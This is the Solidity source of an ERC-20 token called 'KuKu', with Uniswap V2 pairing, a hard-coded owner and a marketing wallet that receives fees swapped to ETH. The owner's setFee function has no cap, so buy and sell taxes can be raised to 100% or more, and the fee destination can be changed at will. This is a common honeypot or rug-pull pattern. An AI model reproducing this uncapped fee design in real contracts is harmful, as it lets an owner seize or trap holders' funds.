1 // SPDX-License-Identifier: Unlicensed
2 pragma solidity ^0.8.4;
3 
4 abstract contract Context {
5 
6     function _msgSender() internal view virtual returns (address payable) {
7         return payable(msg.sender);
8     }
9 
10     function _msgData() internal view virtual returns (bytes memory) {
11         this;
12         // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
13         return msg.data;
14     }
15 }
16 
17 interface IERC20 {
18 
19     function totalSupply() external view returns (uint256);
20 
21     function balanceOf(address account) external view returns (uint256);
22 
23     function transfer(address recipient, uint256 amount) external returns (bool);
24 
25     function allowance(address owner, address spender) external view returns (uint256);
26 
27     function approve(address spender, uint256 amount) external returns (bool);
28 
29     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
30 
31     event Transfer(address indexed from, address indexed to, uint256 value);
32     event Approval(address indexed owner, address indexed spender, uint256 value);
33 }
34 
35 library SafeMath {
36 
37     function add(uint256 a, uint256 b) internal pure returns (uint256) {
38         uint256 c = a + b;
39         require(c >= a, "SafeMath: addition overflow");
40 
41         return c;
42     }
43 
44     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
45         return sub(a, b, "SafeMath: subtraction overflow");
46     }
47 
48     function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
49         require(b <= a, errorMessage);
50         uint256 c = a - b;
51 
52         return c;
53     }
54 
55     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
56         if (a == 0) {
57             return 0;
58         }
59 
60         uint256 c = a * b;
61         require(c / a == b, "SafeMath: multiplication overflow");
62 
63         return c;
64     }
65 
66     function div(uint256 a, uint256 b) internal pure returns (uint256) {
67         return div(a, b, "SafeMath: division by zero");
68     }
69 
70     function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
71         require(b > 0, errorMessage);
72         uint256 c = a / b;
73         // assert(a == b * c + a % b); // There is no case in which this doesn't hold
74 
75         return c;
76     }
77 
78     function mod(uint256 a, uint256 b) internal pure returns (uint256) {
79         return mod(a, b, "SafeMath: modulo by zero");
80     }
81 
82     function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
83         require(b != 0, errorMessage);
84         return a % b;
85     }
86 }
87 
88 library Address {
89 
90     function isContract(address account) internal view returns (bool) {
91         // According to EIP-1052, 0x0 is the value returned for not-yet created accounts
92         // and 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470 is returned
93         // for accounts without code, i.e. `keccak256('')`
94         bytes32 codehash;
95         bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
96         // solhint-disable-next-line no-inline-assembly
97         assembly {codehash := extcodehash(account)}
98         return (codehash != accountHash && codehash != 0x0);
99     }
100 
101     function sendValue(address payable recipient, uint256 amount) internal {
102         require(address(this).balance >= amount, "Address: insufficient balance");
103 
104         // solhint-disable-next-line avoid-low-level-calls, avoid-call-value
105         (bool success,) = recipient.call{ value : amount}("");
106         require(success, "Address: unable to send value, recipient may have reverted");
107     }
108 
109     function functionCall(address target, bytes memory data) internal returns (bytes memory) {
110         return functionCall(target, data, "Address: low-level call failed");
111     }
112 
113     function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
114         return _functionCallWithValue(target, data, 0, errorMessage);
115     }
116 
117     function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
118         return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
119     }
120 
121     function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
122         require(address(this).balance >= value, "Address: insufficient balance for call");
123         return _functionCallWithValue(target, data, value, errorMessage);
124     }
125 
126     function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
127         require(isContract(target), "Address: call to non-contract");
128 
129         (bool success, bytes memory returndata) = target.call{ value : weiValue}(data);
130         if (success) {
131             return returndata;
132         } else {
133 
134             if (returndata.length > 0) {
135                 assembly {
136                     let returndata_size := mload(returndata)
137                     revert(add(32, returndata), returndata_size)
138                 }
139             } else {
140                 revert(errorMessage);
141             }
142         }
143     }
144 }
145 
146 contract Ownable is Context {
147     address public _owner;
148 
149     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
150 
151 
152     function owner() public view returns (address) {
153         return _owner;
154     }
155 
156     modifier onlyOwner() {
157         require(_owner == _msgSender(), "Ownable: caller is not the owner");
158         _;
159     }
160 
161     function waiveOwnership() public virtual onlyOwner {
162         emit OwnershipTransferred(_owner, address(0));
163         _owner = address(0);
164     }
165 
166     function transferOwnership(address newOwner) public virtual onlyOwner {
167         require(newOwner != address(0), "Ownable: new owner is the zero address");
168         emit OwnershipTransferred(_owner, newOwner);
169         _owner = newOwner;
170     }
171 
172     function getTime() public view returns (uint256) {
173         return block.timestamp;
174     }
175 
176 }
177 
178 interface IUniswapV2Factory {
179 
180     function getPair(address tokenA, address tokenB) external view returns (address pair);
181 
182     function createPair(address tokenA, address tokenB) external returns (address pair);
183 
184 }
185 
186 interface IUniswapV2Router01 {
187     function factory() external pure returns (address);
188 
189     function WETH() external pure returns (address);
190 
191     function addLiquidity(
192         address tokenA,
193         address tokenB,
194         uint amountADesired,
195         uint amountBDesired,
196         uint amountAMin,
197         uint amountBMin,
198         address to,
199         uint deadline
200     ) external returns (uint amountA, uint amountB, uint liquidity);
201 
202     function addLiquidityETH(
203         address token,
204         uint amountTokenDesired,
205         uint amountTokenMin,
206         uint amountETHMin,
207         address to,
208         uint deadline
209     ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
210 
211     function removeLiquidityETH(
212         address token,
213         uint liquidity,
214         uint amountTokenMin,
215         uint amountETHMin,
216         address to,
217         uint deadline
218     ) external returns (uint amountToken, uint amountETH);
219 
220     function removeLiquidity(
221         address tokenA,
222         address tokenB,
223         uint liquidity,
224         uint amountAMin,
225         uint amountBMin,
226         address to,
227         uint deadline
228     ) external returns (uint amountA, uint amountB);
229 
230 
231 }
232 
233 interface IUniswapV2Router02 is IUniswapV2Router01 {
234 
235     function swapExactTokensForETHSupportingFeeOnTransferTokens(
236         uint amountIn,
237         uint amountOutMin,
238         address[] calldata path,
239         address to,
240         uint deadline
241     ) external;
242 }
243 
244 
245 contract Token is Context, IERC20, Ownable {
246 
247     using SafeMath for uint256;
248     using Address for address;
249 
250     string private _name;
251     string private _symbol;
252     uint8 private _decimals;
253     address payable public marketingWalletAddress = payable(0x6996F0AAB387C80fE1E2EEcEe5d8724E516eF09E);
254     address public deadAddress = 0x000000000000000000000000000000000000dEaD;
255 
256     mapping (address => uint256) _balances;
257     mapping (address => mapping (address => uint256)) private _allowances;
258 
259     mapping (address => bool) public isExcludedFromFee;
260     mapping (address => bool) public isMarketPair;
261 
262 
263     uint256 public _totalTaxIfBuying = 0;
264     uint256 public _totalTaxIfSelling = 0;
265 
266     uint256 private _totalSupply;
267     uint256 private _minimumTokensBeforeSwap = 0;
268 
269 
270 
271     IUniswapV2Router02 public uniswapV2Router;
272     address public uniswapPair;
273 
274     bool inSwapAndLiquify;
275     bool public swapAndLiquifyEnabled = true;
276     bool public swapAndLiquifyByLimitOnly = false;
277 
278     event SwapAndLiquifyEnabledUpdated(bool enabled);
279     event SwapAndLiquify(
280         uint256 tokensSwapped,
281         uint256 ethReceived,
282         uint256 tokensIntoLiqudity
283     );
284 
285     event SwapETHForTokens(
286         uint256 amountIn,
287         address[] path
288     );
289 
290     event SwapTokensForETH(
291         uint256 amountIn,
292         address[] path
293     );
294 
295     modifier lockTheSwap {
296         inSwapAndLiquify = true;
297         _;
298         inSwapAndLiquify = false;
299     }
300 
301 
302     constructor (
303     ) payable {
304 
305         IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
306 
307         uniswapPair = IUniswapV2Factory(_uniswapV2Router.factory())
308             .createPair(address(this), _uniswapV2Router.WETH());
309         _name = "KuKu";
310         _symbol = "KuKu";
311         _decimals = 0;
312         _owner = 0xB26EB909Cf4Df8bcc1d5207b00a07616286918f5;
313         _totalSupply = 10000000000000000000000000000000000000000000000000000000000000000000000000000;
314         _minimumTokensBeforeSwap = 1000000000000000000000000000;
315         uniswapV2Router = _uniswapV2Router;
316         _allowances[address(this)][address(uniswapV2Router)] = _totalSupply;
317         isExcludedFromFee[_owner] = true;
318         isExcludedFromFee[address(this)] = true;
319         isExcludedFromFee[marketingWalletAddress] = true;
320 
321         isMarketPair[address(uniswapPair)] = true;
322 
323         _balances[_owner] = _totalSupply;
324         emit Transfer(address(0), _owner, _totalSupply);
325     }
326 
327 
328     function name() public view returns (string memory) {
329         return _name;
330     }
331 
332     function symbol() public view returns (string memory) {
333         return _symbol;
334     }
335 
336     function decimals() public view returns (uint8) {
337         return _decimals;
338     }
339 
340     function totalSupply() public view override returns (uint256) {
341         return _totalSupply;
342     }
343 
344     function balanceOf(address account) public view override returns (uint256) {
345         return _balances[account];
346     }
347 
348     function allowance(address owner, address spender) public view override returns (uint256) {
349         return _allowances[owner][spender];
350     }
351 
352     function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
353         _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
354         return true;
355     }
356 
357     function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
358         _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
359         return true;
360     }
361 
362     function minimumTokensBeforeSwapAmount() public view returns (uint256) {
363         return _minimumTokensBeforeSwap;
364     }
365 
366     function approve(address spender, uint256 amount) public override returns (bool) {
367         _approve(_msgSender(), spender, amount);
368         return true;
369     }
370 
371     function _approve(address owner, address spender, uint256 amount) private {
372         require(owner != address(0), "ERC20: approve from the zero address");
373         require(spender != address(0), "ERC20: approve to the zero address");
374 
375         _allowances[owner][spender] = amount;
376         emit Approval(owner, spender, amount);
377     }
378 
379     function setMarketPairStatus(address account, bool newValue) public onlyOwner {
380         isMarketPair[account] = newValue;
381     }
382 
383     function setNumTokensBeforeSwap(uint256 newLimit) external onlyOwner() {
384         _minimumTokensBeforeSwap = newLimit;
385     }
386 
387     function setSwapAndLiquifyEnabled(bool _enabled) public onlyOwner {
388         swapAndLiquifyEnabled = _enabled;
389         emit SwapAndLiquifyEnabledUpdated(_enabled);
390     }
391 
392     function setSwapAndLiquifyByLimitOnly(bool newValue) public onlyOwner {
393         swapAndLiquifyByLimitOnly = newValue;
394     }
395 
396     function setFee(uint256 buy,uint256 sell) public onlyOwner {
397         _totalTaxIfBuying = buy;
398         _totalTaxIfSelling = sell;
399     }
400 
401     function setMarketAddress(address addr) public onlyOwner {
402         marketingWalletAddress = payable(addr);
403     }
404 
405     function getCirculatingSupply() public view returns (uint256) {
406         return _totalSupply.sub(balanceOf(deadAddress));
407     }
408 
409     function transferToAddressETH(address payable recipient, uint256 amount) private {
410         recipient.transfer(amount);
411     }
412     
413      //to recieve ETH from uniswapV2Router when swaping
414     receive() external payable {}
415 
416     function transfer(address recipient, uint256 amount) public override returns (bool) {
417         _transfer(_msgSender(), recipient, amount);
418         return true;
419     }
420 
421     function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
422         _transfer(sender, recipient, amount);
423         _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
424         return true;
425     }
426 
427     function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
428 
429         require(sender != address(0), "ERC20: transfer from the zero address");
430         require(recipient != address(0), "ERC20: transfer to the zero address");
431         require(amount > 0, "Transfer amount must be greater than zero");
432         
433 
434         if(inSwapAndLiquify)
435         {
436             return _basicTransfer(sender, recipient, amount);
437         }
438         else
439         {
440 
441             uint256 contractTokenBalance = balanceOf(address(this));
442             bool overMinimumTokenBalance = contractTokenBalance >= _minimumTokensBeforeSwap;
443 
444             if (overMinimumTokenBalance && !inSwapAndLiquify && !isMarketPair[sender] && swapAndLiquifyEnabled)
445             {
446                 if(swapAndLiquifyByLimitOnly)
447                     contractTokenBalance = _minimumTokensBeforeSwap;
448                 swapAndLiquify(contractTokenBalance);
449             }
450 
451             _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
452 
453             uint256 finalAmount = (isExcludedFromFee[sender] || isExcludedFromFee[recipient]) ?
454                                          amount : takeFee(sender, recipient, amount);
455 
456 
457             _balances[recipient] = _balances[recipient].add(finalAmount);
458 
459             emit Transfer(sender, recipient, finalAmount);
460             return true;
461         }
462     }
463 
464     function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
465         _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
466         _balances[recipient] = _balances[recipient].add(amount);
467         emit Transfer(sender, recipient, amount);
468         return true;
469     }
470 
471 
472     function swapAndLiquify(uint256 tAmount) private lockTheSwap {
473 
474         // swap token -> eth
475         swapTokensForEth(tAmount);
476         uint256 amountReceived = address(this).balance;
477          
478         if(amountReceived > 0)
479             transferToAddressETH(marketingWalletAddress, amountReceived);
480 
481     }
482 
483     function swapTokensForEth(uint256 tokenAmount) private {
484         // generate the uniswap pair path of token -> weth
485         address[] memory path = new address[](2);
486         path[0] = address(this);
487         path[1] = uniswapV2Router.WETH();
488 
489         _approve(address(this), address(uniswapV2Router), tokenAmount);
490 
491         // make the swap
492         uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
493             tokenAmount,
494             0, // accept any amount of ETH
495             path,
496             address(this), // The contract
497             block.timestamp
498         );
499 
500         emit SwapTokensForETH(tokenAmount, path);
501     }
502 
503 
504 
505     function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
506 
507         uint256 feeAmount = 0;
508         if(isMarketPair[sender]) {
509             feeAmount = amount.mul(_totalTaxIfBuying).div(100);
510         }
511         else if(isMarketPair[recipient]) {
512             feeAmount = amount.mul(_totalTaxIfSelling).div(100);
513         }
514         if(feeAmount > 0) {
515             _balances[address(this)] = _balances[address(this)].add(feeAmount);
516             emit Transfer(sender, address(this), feeAmount);
517         }
518 
519         return amount.sub(feeAmount);
520     }
521 
522    
523 }